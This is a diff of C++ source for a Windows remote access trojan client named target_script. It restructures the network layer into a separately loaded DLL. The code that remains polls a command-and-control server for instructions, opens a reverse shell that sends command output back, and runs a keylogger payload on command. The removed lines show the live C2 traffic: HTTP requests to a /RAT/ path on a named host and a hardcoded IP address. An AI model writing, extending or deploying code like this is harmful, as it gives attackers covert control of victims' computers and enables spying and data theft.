@@ -1,3 +1,13 @@
+/*
+    target_script
+
+    Things to do:
+    1. Load the dll
+
+
+*/
+
+// cl /EHsc .\target_script.cpp /link ws2_32.lib /OUT:target_script.exe  
 #include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
@@ -7,36 +17,70 @@
 #include <sstream>                                                              // Include for stringstream
 #include <mutex>
 #include <fstream>
+#include <vector>
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
 
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef string (*RecvDataFunc)(const std::string&);
+typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+RecvDataRawFunc receive_data_raw;
+
+LPCSTR dllPath = "network_lib.dll";
+HINSTANCE hDLL;
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 bool connected = false;
 
-std::mutex socketMutex; 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-bool socket_setup(SOCKET &clientSocket);
-void safe_closesocket(SOCKET &clientSocket);
-
-void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
-string receive_data(SOCKET &clientSocket, const string &filename);
 
 bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
 void rev_shell(SOCKET &clientSocket);
+
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+int load_dll()
+{
+    hDLL = LoadLibraryA(dllPath);
+    if (hDLL == NULL)
+    {
+        printf("Failed to load DLL: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+
+    if (!receive_data || !send_data || !receive_data_raw)
+    {
+        std::cerr << "Failed to get one or more function addresses.\n";
+        FreeLibrary(hDLL);
+        return 1;
+    }
+
+    return 0;
+}
 
 int main()
 {
+    
+    load_dll();
+
     SOCKET sock = INVALID_SOCKET;
 
     bool outerloop = true;
     while(outerloop)
     {
-        connected = socket_setup(sock);
+        connected = TRUE;
 
         Sleep(2000);
 
@@ -44,75 +88,54 @@ int main()
         std::string lines[3];
 
         for (int i = 0; i < 3 && std::getline(file, lines[i]); ++i);
-        send_data(sock, "con_targets.txt", lines[1] + " ( " + lines[2] +" )");
+        send_data("con_targets.txt", lines[1] + " ( " + lines[2] +" )");
 
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
         bool loop = true;
         while(loop)
         {
-            if(receive_data(sock,"from_server.txt")[0] == '`')
+            if(receive_data("from_server.txt")[0] == '`')
             {
                 Sleep(1000);
                 cout<< "waiting for data " << endl;
             }
             else
             {
-                char option = receive_data(sock,"from_server.txt")[0];
+                char option = receive_data("from_server.txt")[0];
                 cout << "option: " << option << endl;
                 switch (option)
                 {
                     case '3':                                                                                     //rev shell
                     {
-                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                         
                         rev_shell(sock);
                         break;
                     }
-
-                    case '4':                                                                                     //keystroke injection
+                    case '4':                                                                                     //keylogger
                     {
                         
-                        if(receive_data(sock,"from_server.txt")[0] == '`')
+                        if(receive_data("from_server.txt")[0] == '`')
                         {
                             Sleep(100);
                             cout<< "waiting for payload " << endl;
                         }      
                         else
                         {
-                            string payload = (receive_data(sock,"from_server.txt").substr(1));
-                            cout << "Recieved after waiting ->" << payload << endl;
-                            ExecuteCommand(payload);
-                        }
-                        
-                        send_data(sock,"from_server.txt","`");
-                        //cout << "mark the received command as read [switch3]" << endl;
-                        break;
-                    }
-
-                    case '5':                                                                                     //keylogger
-                    {
-                        
-                        if(receive_data(sock,"from_server.txt")[0] == '`')
-                        {
-                            Sleep(100);
-                            cout<< "waiting for payload " << endl;
-                        }      
-                        else
-                        {
-                            string payload_keylogger = (receive_data(sock,"from_server.txt").substr(1));
+                            string payload_keylogger = (receive_data("from_server.txt").substr(1));
                             cout << "Recieved after waiting ->" << payload_keylogger << endl;
                             ExecuteCommand(payload_keylogger);
                         }
                         
-                        send_data(sock,"from_server.txt","`");
+                        send_data("from_server.txt","`");
                         //cout << "mark the received command as read [switch3]" << endl;
                         break;
                     }
 
                     case '~':                                                                                    //dc from server
                     {
-                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                         //cout << "mark the file read [switch] inside case ~" << endl;
                         
                         //std::cout << "Server initiated disconnect.\n";
@@ -123,19 +146,19 @@ int main()
                     }
                     case '#':                                                                                    //end all
                     {
-                        if(receive_data(sock,"from_server.txt")[0] == '`')
+                        if(receive_data("from_server.txt")[0] == '`')
                         {
                             Sleep(100);
                             cout<< "waiting for payload " << endl;
                         }      
                         else
                         {
-                            string payload = (receive_data(sock,"from_server.txt").substr(1));
-                            cout << "Recieved after waiting ->" << payload << endl;
-                            ExecuteCommand("hello.vbs");
+                            string payload_end = (receive_data("from_server.txt").substr(1));
+                            cout << "Recieved after waiting ->" << payload_end << endl;
+                            //ExecuteCommand(payload_end);
                         }
                         
-                        send_data(sock,"from_server.txt","`");
+                        send_data("from_server.txt","`");
                         //cout << "mark the received command as read [del]" << endl;
                         loop = false;
                         outerloop = false;
@@ -145,9 +168,9 @@ int main()
                     default:
                     {
                         //cout << "mark the file read [switch] inside default" << "->\n";
-                        //cout << receive_data(sock,"from_server.txt") << endl;
+                        //cout << receive_data("from_server.txt") << endl;
 
-                        send_data(sock,"from_server.txt","`");                                                //mark the file read(switch)
+                        send_data("from_server.txt","`");                                                //mark the file read(switch)
                                                
                         break;
                     }
@@ -198,156 +221,6 @@ void give_command(const std::string &command)
     DWORD bytesWritten;
     if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL)) cerr << "WriteFile failed with error code: " << GetLastError() << endl;
     FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
-}
-
-void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
-{
-    {
-        lock_guard<mutex> lock1(socketMutex); 
-        
-        socket_setup(clientSocket);
-
-        string whole_data = filename+data;
-        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
-        httpRequest += "Content-Type: application/octet-stream\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-        httpRequest += whole_data;                                                                // Append the actual data
-
-
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        }
-    
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
-
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-            if (bytesReceived > 0)
-            {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            }
-            else if (bytesReceived == 0)
-            {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            }
-            else
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        safe_closesocket(clientSocket);
-    }
-}
-
-string receive_data(SOCKET &clientSocket, const string &filename)
-{
-    {
-        lock_guard<mutex> lock1(socketMutex);
-
-        socket_setup(clientSocket);
-
-        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-
-        //cout<< httpRequest<<endl;
-
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        }
-
-        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
-
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-            if (bytesReceived > 0)
-            {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            } 
-            else if (bytesReceived == 0)
-            {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            } else
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-
-        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        // Robust HTTP response parsing
-        size_t headerEnd = receivedData.find("\r\n\r\n");
-        if (headerEnd == string::npos) {
-            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
-            return "";
-        }
-
-        string body = receivedData.substr(headerEnd + 4);
-
-        //Handle chunked transfer encoding (if present)
-        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
-        if (transferEncodingPos != string::npos)
-        {
-            string unchunkedBody;
-            istringstream bodyStream(body);
-            string chunkLengthStr;
-
-            while (getline(bodyStream, chunkLengthStr))
-            {
-                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
-
-                size_t chunkSize;
-                stringstream ss;
-                ss << hex << chunkLengthStr;
-                ss >> chunkSize;
-
-                if (chunkSize == 0) break; // End of chunked data
-
-                string chunkData(chunkSize, '\0');
-                bodyStream.read(&chunkData[0], chunkSize);
-
-                unchunkedBody += chunkData;
-                bodyStream.ignore(2); // Consume CRLF after chunk
-            }
-            body = unchunkedBody;
-        }
-        safe_closesocket(clientSocket);
-
-        //send_data(clientSocket, "from_server.txt", "`");
-        return body;
-
-    }
 }
 
 void rev_shell(SOCKET &clientSocket)
@@ -404,7 +277,7 @@ void rev_shell(SOCKET &clientSocket)
                 {
                     buffer[bytesRead] = '\0';
                     cout << buffer;
-                    send_data(clientSocket, "from_client.txt" ,buffer);
+                    send_data("from_client.txt" ,buffer);
                 }
             } 
             else if (GetLastError() == ERROR_BROKEN_PIPE)
@@ -426,18 +299,18 @@ void rev_shell(SOCKET &clientSocket)
 
             Sleep(500);
 
-            if(receive_data(clientSocket,"from_server.txt")[0] == '`')
+            if(receive_data("from_server.txt")[0] == '`')
             {
                 //cout<< "waiting for rev shell data " << endl;
                 continue;
             }
             
-            cmd = receive_data(clientSocket, "from_server.txt");
-            send_data(clientSocket,"from_server.txt","`");
+            cmd = receive_data("from_server.txt");
+            send_data("from_server.txt","`");
             if (cmd == "exit")
             {
                 processFinished.store(true); // Signal to stop reading thread
-                send_data(clientSocket,"from_client.txt","`");
+                send_data("from_client.txt","`");
                 break;
             }
 
@@ -468,61 +341,4 @@ void rev_shell(SOCKET &clientSocket)
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);    
 
-}
-
-void safe_closesocket(SOCKET &clientSocket)
-{
-    if (clientSocket != INVALID_SOCKET)
-    {
-        shutdown(clientSocket, SD_BOTH);
-        closesocket(clientSocket);
-        
-        clientSocket = INVALID_SOCKET;
-    }
-}
-
-bool socket_setup(SOCKET &clientSocket)
-{
-    bool connected = false;
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-    {
-        std::cerr << "WSAStartup failed.\n";
-        return 1;
-    }
-
-    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (clientSocket == INVALID_SOCKET)
-    {
-        std::cerr << "socket failed.\n";
-        WSACleanup();
-        return 1;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    
-    serverAddr.sin_port = htons(80);
-    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
-
-    connected = false;
-    while (!connected)
-    {
-        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            if (error != WSAECONNREFUSED)
-            {
-                std::stringstream ss;
-                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
-                std::cerr << ss.str();
-            }   
-            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-            Sleep(2000);
-        }
-        else connected = true;
-
-    }
-    return true;
 }
